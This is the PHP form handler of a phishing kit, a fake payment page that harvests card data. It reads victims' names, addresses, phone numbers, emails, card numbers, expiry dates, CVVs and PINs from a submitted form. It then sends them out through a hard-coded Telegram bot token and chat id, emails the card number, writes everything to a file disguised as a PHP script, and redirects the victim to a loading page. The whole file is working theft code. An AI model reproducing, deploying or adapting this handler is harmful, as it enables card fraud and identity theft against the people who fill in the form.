<?php

$ip = $_SERVER['REMOTE_ADDR'];
//$hostname = gethostbyaddr($ip);
$xd .= "|----------||--------------|\n";
$xd .= "|name            : ".$_POST['name']."\n";
$xd .= "|add          : ".$_POST['add']."\n";
$xd .= "|pos          : ".$_POST['zip']."\n";
$xd .= "|tel          : ".$_POST['num']."\n";
$xd .= "|email        : ".$_POST['mail']."\n";
$xd .= "|----------| cvv |--------------|\n";
$xd .= "Cc              : ".$_POST['cc_number']."\n";
$xd .= "dt              : ".$_POST['cc_date']."\n";
$xd .= "Cvv             : ".$_POST['cc_ccv']."\n";
$xd .= "pin             : ".$_POST['pin']."\n";
$xd .= "|Client IP: ".$ip."\n";
$hello   .= "Hello Bro its Come   : ".$_POST['cc_number']."\n";
//$xd .= "|HostName : ".$hostname."\n";
$xd .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$xd .= "|----------||--------------|\n";
$subject = "From:  [ $ip ]";
{
mail("$send", "$subject", $hello);
$token = "5703940771:AAFOhxTin4vxerhgYX1oTfTwKfjM4u3D7OA";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-629611618&text=" . urlencode($xd)."" );
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-629611618&text=" . urlencode($hello)."" );
}

$f = fopen("../python/python.php", "a");
	fwrite($f, $xd);

header("Location:loading.html");
?>
